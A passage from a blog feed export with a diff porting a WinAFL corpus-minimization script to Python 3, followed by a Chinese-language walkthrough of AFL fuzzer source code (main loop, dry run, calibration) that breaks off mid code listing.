elif(argv[1] == &#x27;-cp&#x27; or argv[1] == &quot;-copy&quot;):</span></span><br><span class="line"><span class="addition">+        args = CpArgsparse()</span></span><br><span class="line"><span class="addition">+        file = &quot;&quot;.join(args.copy)  </span></span><br><span class="line"><span class="addition">+        if os.path.isfile(file) is False:</span></span><br><span class="line"><span class="addition">+            print(&#x27;[!] The argument of \&#x27;- move\&#x27; %s is not a file. Or it doesn\&#x27;t exist&#x27; %(file))</span></span><br><span class="line"><span class="addition">+            return 1</span></span><br><span class="line"><span class="addition">+        if os.path.isdir(args.output):</span></span><br><span class="line"><span class="addition">+           print(&#x27;[!] %s already exists, please remove it to avoid data loss.&#x27; %(args.output))</span></span><br><span class="line"><span class="addition">+           return 1</span></span><br><span class="line"><span class="addition">+        output = []</span></span><br><span class="line"><span class="addition">+        for line in open(file): </span></span><br><span class="line"><span class="addition">+            line = line.strip(&quot;\n&quot;)</span></span><br><span class="line"><span class="addition">+            output.append(line)</span></span><br><span class="line"><span class="addition">+        path = os.getcwd()+&quot;\\&quot;+str(args.output)</span></span><br><span class="line"><span class="addition">+        os.mkdir(args.output)</span></span><br><span class="line"><span class="addition">+        for file_path in output:</span></span><br><span class="line"><span class="addition">+            print(&quot;Copy %s to %s&quot; %(file_path, path))</span></span><br><span class="line"><span class="addition">+            do_unique_copy(file_path, args.output)</span></span><br><span class="line"><span class="addition">+        return 0</span></span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     args = setup_argparse()</span><br><span class="line"><span class="addition">+    check_file(&quot;output.txt&quot;)</span></span><br><span class="line"><span class="addition">+    check_file(&quot;crash_files.txt&quot;)</span></span><br><span class="line"><span class="addition">+    check_file(&quot;hang_files.txt&quot;)</span></span><br><span class="line">     cli_handler = logging.StreamHandler(sys.stdout)</span><br><span class="line">     cli_handler.setLevel(args.verbose)</span><br><span class="line">     logging.getLogger().addHandler(cli_handler)</span><br><span class="line"><span class="meta">@@ -419,7 +497,7 @@</span></span><br><span class="line">     # Do a dry run with the first file in the set</span><br><span class="line">     logging.info(&#x27;[*] Testing the target binary...&#x27;)</span><br><span class="line">     f = AFLShowMapWorker(args)</span><br><span class="line"><span class="deletion">-    results = map(f, (inputs[0], inputs[0]))</span></span><br><span class="line"><span class="addition">+    results = list(map(f, (inputs[0], inputs[0])))</span></span><br><span class="line">     if results[0] != results[1]:</span><br><span class="line">         logging.error(&#x27;[!] Dry-run failed, 2 executions resulted differently:&#x27;)</span><br><span class="line">         logging.error(</span><br><span class="line"><span class="meta">@@ -435,7 +513,6 @@</span></span><br><span class="line">             return 1</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -497,12 +571,10 @@</span></span><br><span class="line"> </span><br><span class="line">     # Counter tracking how many files we have been through already.</span><br><span class="line">     i = 1</span><br><span class="line"><span class="deletion">-    for result in p.imap_unordered(</span></span><br><span class="line"><span class="deletion">-        AFLShowMapWorker(args),</span></span><br><span class="line"><span class="deletion">-        inputs</span></span><br><span class="line"><span class="deletion">-    ):</span></span><br><span class="line"><span class="deletion">-        print &#x27;\rProcessing file %d/%d...&#x27; % (i, inputs_len),</span></span><br><span class="line"><span class="addition">+    for result in p.imap_unordered(AFLShowMapWorker(args), inputs):</span></span><br><span class="line"><span class="addition">+        print(&#x27;\rProcessing file %d/%d...&#x27; % (i, inputs_len)),</span></span><br><span class="line">         i += 1</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">         # If the set of tuples is empty, something weird happened</span><br><span class="line">         if len(result.tuples) == 0:</span><br><span class="line">             logging.debug(</span><br><span class="line"><span class="meta">@@ -516,12 +588,15 @@</span></span><br><span class="line">         if result.returncode != wanted_returncode:</span><br><span class="line">             if result.returncode == 1:</span><br><span class="line">                 hang_files.append(result.path)</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="addition">+                with open(&#x27;hang_files.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;)</span></span><br><span class="line">             # If the mode crash only is enabled, we track the non-crashing</span><br><span class="line">             # test cases in the same tuple.</span><br><span class="line">             if (result.returncode == 2 and args.crash_only is False) or \</span><br><span class="line">                (result.returncode == 0 and args.crash_only):</span><br><span class="line">                 crash_files.append(result.path)</span><br><span class="line"><span class="addition">+                with open(&#x27;crash_files.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;)</span></span><br><span class="line"> </span><br><span class="line">             if args.crash_only is False:</span><br><span class="line">                 logging.debug(</span><br><span class="line"><span class="meta">@@ -539,14 +614,13 @@</span></span><br><span class="line">             continue</span><br><span class="line"> </span><br><span class="line">         totalsize += result.filesize</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">         # Generate the list of unique tuples while processing the results,</span><br><span class="line">         # also keep track of their popularities.</span><br><span class="line">         uniq_tuples.update(result.tuples.keys())</span><br><span class="line"> </span><br><span class="line">         # Keep an updated dictionary mapping a tuple to the fittest file</span><br><span class="line">         # of all the paths.</span><br><span class="line"><span class="deletion">-        for tuple_id, tuple_hitcount in result.tuples.iteritems():</span></span><br><span class="line"><span class="addition">+        for tuple_id, tuple_hitcount in result.tuples.items():</span></span><br><span class="line">             fileinfo = &#123;</span><br><span class="line">                 &#x27;size&#x27; : result.filesize,</span><br><span class="line">                 &#x27;path&#x27; : result.path,</span><br><span class="line"><span class="meta">@@ -573,6 +647,10 @@</span></span><br><span class="line">             else:</span><br><span class="line">                 candidates[tuple_id] = fileinfo</span><br><span class="line"> </span><br><span class="line"><span class="addition">+        with open(&#x27;output.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;) </span></span><br><span class="line"><span class="addition">+            </span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     len_crash_files, len_hang_files, len_empty_tuple_files = map(</span><br><span class="line">         len, (crash_files, hang_files, empty_tuple_files)</span><br><span class="line">     )</span><br><span class="line"><span class="meta">@@ -586,6 +664,7 @@</span></span><br><span class="line">         &#x27;[+] Found %d unique tuples across %d files&#x27;,</span><br><span class="line">         len_uniq_tuples, effective_len</span><br><span class="line">     )</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     if len_hang_files &gt; 0:</span><br><span class="line">         logging.info(&#x27;  - %d files triggered a hang&#x27;, len_hang_files)</span><br><span class="line">         for hang_file in hang_files:</span><br><span class="line"><span class="meta">@@ -609,7 +688,6 @@</span></span><br><span class="line">             logging.debug(&#x27;    - %s generated an empty tuple&#x27;, empty_tuple_file)</span><br><span class="line"> </span><br><span class="line">     logging.info(&#x27;[*] Finding best candidates for each tuple...&#x27;)</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">     # Using the same strategy than in afl-cmin, quoting lcamtuf:</span><br><span class="line">     # &#x27;&#x27;&#x27;</span><br><span class="line">     # The &quot;best&quot; part is understood simply as the smallest input that</span><br><span class="line"><span class="meta">@@ -631,7 +709,7 @@</span></span><br><span class="line"> </span><br><span class="line">         # Remove the other tuples also exercised by the candidate</span><br><span class="line">         # from the remaining_tuples list.</span><br><span class="line"><span class="deletion">-        for tuple_exercised in candidate[&#x27;tuples&#x27;].iterkeys():</span></span><br><span class="line"><span class="addition">+        for tuple_exercised in candidate[&#x27;tuples&#x27;].keys():</span></span><br><span class="line">             # Remove the tuples exercised if we have not</span><br><span class="line">             # removed them already from the</span><br><span class="line">             # remaining_tuples list.</span><br><span class="line"><span class="meta">@@ -640,15 +718,16 @@</span></span><br><span class="line"> </span><br><span class="line">         # Keep track of the final minset and its size.</span><br><span class="line">         minset.append(candidate[&#x27;path&#x27;])</span><br><span class="line"><span class="addition">+        </span></span><br><span class="line">         minsetsize += candidate[&#x27;size&#x27;]</span><br><span class="line"> </span><br><span class="line">         # We are now done with this tuple, we can get rid of it.</span><br><span class="line">         del candidates[tuple_]</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-        print &#x27;\rProcessing tuple %d/%d...&#x27; % (</span></span><br><span class="line"><span class="addition">+        print(&#x27;\rProcessing tuple %d/%d...&#x27; % (</span></span><br><span class="line">             len_uniq_tuples - len(remaining_tuples),</span><br><span class="line">             len_uniq_tuples</span><br><span class="line"><span class="deletion">-        ),</span></span><br><span class="line"><span class="addition">+        )),</span></span><br><span class="line"> </span><br><span class="line">         # If we don&#x27;t have any more tuples left, we are done.</span><br><span class="line">         if len(remaining_tuples) == 0:</span><br><span class="line"><span class="meta">@@ -670,10 +749,14 @@</span></span><br><span class="line">             &#x27;[*] Saving the minset in %s...&#x27;, os.path.abspath(args.output)</span><br><span class="line">         )</span><br><span class="line">         os.mkdir(args.output)</span><br><span class="line"><span class="addition">+        os.system(&quot;del output.txt&quot;)</span></span><br><span class="line">         for file_path in minset:</span><br><span class="line"><span class="addition">+            with open(&#x27;output.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                f.write(file_path+&quot;\n&quot;)</span></span><br><span class="line">             do_unique_copy(file_path, args.output)</span><br><span class="line"> </span><br><span class="line">     logging.info(&#x27;[+] Time elapsed: %d seconds&#x27;, time.time() - t0)</span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     return 0</span><br><span class="line"> </span><br><span class="line"> if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Winafl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL 源码分析</title>
      <link href="posts/e04d4cd1/"/>
      <url>posts/e04d4cd1/</url>
      
        <content type="html"><![CDATA[<p>整体看的比较匆忙:(</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20201119171914.jpg" alt="15710161322527"></p><h1 id="Fuzz流程"><a href="#Fuzz流程" class="headerlink" title="Fuzz流程"></a>Fuzz流程</h1><ol><li><p>afl_fuzz的main函数会解析用户输入命令，检查环境变量的设置、输入输出路径、目标文件。程序定义了结构体<strong>queue_entry</strong>链表维护fuzz中使用的文件。</p></li><li><p>函数<strong>perform_dry_run()</strong> 会使用初始的测试用例进行测试，确保目标程序能够正常执行,生成初始化的queue和bitmap。</p></li><li><p>函数 <strong>cull_queue()</strong> 会对初始队列进行筛选（更新favored entry）。遍历top_rated[]中的queue，然后提取出发现新edge的entry，并标记为favored，使得在下次遍历queue时，这些entry能获得更多执行fuzz的机会。</p></li><li><p>进入while(1)开始fuzz循环</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入循环后第一部还是 cull_queue() 对queue进行筛选</span><br><span class="line">判断queue_cur是否为空，如果是，则表示已经完成对队列的遍历，初始化相关参数，重新开始遍历队列</span><br><span class="line">fuzz_one() 函数会对queue_cur所对应文件进行fuzz，包括(跳过calibrate_case -修剪测试用例 -对用例评分 - 确定性变异或直接havoc&amp;ssplice)</span><br><span class="line">判断是否结束，更新queue_cur和current_entry</span><br><span class="line">当队列中的所有文件都经过变异测试了，则完成一次”cycle done”。整个队列又会从第一个文件开始，再次继续进行变异</span><br></pre></td></tr></table></figure></li></ol><p>其主要流程都写在<code>main</code>函数里面了，我们分析一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;+i:o:f:m:t:T:dnCB:S:M:x:Q&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"> ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  setup_signal_handlers();</span><br><span class="line">  check_asan_opts();</span><br><span class="line">  ...</span><br><span class="line">  save_cmdline(argc, argv);</span><br><span class="line">  fix_up_banner(argv[optind]);</span><br><span class="line">  check_if_tty();</span><br><span class="line">  get_core_count();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  bind_to_free_cpu();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line">  check_crash_handling();</span><br><span class="line">  check_cpu_governor();</span><br><span class="line">  setup_post();</span><br><span class="line">    </span><br><span class="line">  setup_shm();</span><br><span class="line">    </span><br><span class="line">  init_count_class16();</span><br><span class="line">  setup_dirs_fds();</span><br><span class="line">  read_testcases();</span><br><span class="line">  load_auto();</span><br><span class="line">  pivot_inputs();</span><br><span class="line">  <span class="keyword">if</span> (extras_dir) load_extras(extras_dir);</span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) find_timeout();</span><br><span class="line">  detect_file_args(argv + optind + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (!out_file) setup_stdio_file();</span><br><span class="line">  check_binary(argv[optind]);</span><br><span class="line">  start_time = get_cur_time();</span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)</span><br><span class="line">    use_argv = get_qemu_argv(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    use_argv = argv + optind;</span><br><span class="line"></span><br><span class="line">  perform_dry_run(use_argv);</span><br><span class="line"></span><br><span class="line">  cull_queue();</span><br><span class="line"></span><br><span class="line">  show_init_stats();</span><br><span class="line"></span><br><span class="line">  seek_to = find_start_position();</span><br><span class="line"></span><br><span class="line">  write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  save_auto();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Woop woop woop */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">    sleep(<span class="number">4</span>);</span><br><span class="line">    start_time += <span class="number">4000</span>;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">    cull_queue();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line"></span><br><span class="line">      queue_cycle++;</span><br><span class="line">      current_entry     = <span class="number">0</span>;</span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">      queue_cur         = <span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      show_stats();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        ACTF(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">         recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; getenv(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        sync_fuzzers(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    skipped_fuzz = fuzz_one(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        sync_fuzzers(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur) show_stats();</span><br><span class="line"></span><br><span class="line">  write_bitmap();</span><br><span class="line">  write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  save_auto();</span><br><span class="line"></span><br><span class="line">stop_fuzzing:</span><br><span class="line"></span><br><span class="line">  SAYF(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; get_cur_time() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fclose(plot_file);</span><br><span class="line">  destroy_queue();</span><br><span class="line">  destroy_extras();</span><br><span class="line">  ck_free(target_path);</span><br><span class="line">  ck_free(sync_id);</span><br><span class="line"></span><br><span class="line">  alloc_report();</span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="初始准备"><a href="#初始准备" class="headerlink" title="初始准备"></a>初始准备</h1><h2 id="get-opt"><a href="#get-opt" class="headerlink" title="get opt"></a>get opt</h2><p>第一个<code>while</code>循环去获取获取各种环境的设置，选项参数等等。其实就是 <code>alf-fuzz --help</code>里面的内容就不赘述了。</p><p>紧接着会进行一系列检测操作。</p><h2 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h2><p>设置信号句柄</p><h2 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h2><p>保存命令行参数</p><h2 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h2><p>设置共享内存</p><h2 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h2><p>初始化计算代码覆盖率的表单</p><h2 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h2><p>初始化输出文件夹和fd</p><h2 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h2><p>从输入文件夹中读取所有文件，然后将它们排队进行测试。</p><h2 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h2><p>如果有-t的设置了自己的超时，那么会触发这个函数。</p><h2 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h2><p>识别参数里面有没有<code>@@</code>，如果有就替换为<code>out_dir/.cur_input</code>，如果没有就返回</p><h1 id="dry-run"><a href="#dry-run" class="headerlink" title="dry run"></a>dry run</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_dry_run</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span>* <span class="title">q</span> = <span class="title">queue</span>;</span></span><br><span class="line">  u32 cal_failures = <span class="number">0</span>;</span><br><span class="line">  u8* skip_crashes = getenv(<span class="string">&quot;AFL_SKIP_CRASHES&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">...</span><br><span class="line">    u8* fn = <span class="built_in">strrchr</span>(q-&gt;fname, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">    ACTF(<span class="string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line">     </span><br><span class="line">    fd = open(q-&gt;fname, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    use_mem = ck_alloc_nozero(q-&gt;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, use_mem, q-&gt;len) != q-&gt;len)</span><br><span class="line">      FATAL(<span class="string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    res = calibrate_case(argv, q, use_mem, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    ck_free(use_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)</span><br><span class="line">      SAYF(cGRA <span class="string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST, </span><br><span class="line">           q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (res) &#123;</span><br><span class="line">           ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;var_behavior) WARNF(<span class="string">&quot;Instrumentation output varies across runs.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    q = q-&gt;next;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  OKF(<span class="string">&quot;All test cases processed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行 input 文件夹下的预先准备的所有 testcase，生成初始化的 queue 和 bitmap。这只对初始输入执行一次，所以叫：dry run。</p><p>其实就是简单跑一遍所有的 testcase，然后看看有没有什么异常，比如：crash，无法触发新的路径，以确保样本和 target 的正确性。</p><p>然后这里面比较关键的函数是 <code>res = calibrate_case(argv, q, use_mem, 0, 1);</code></p><h2 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 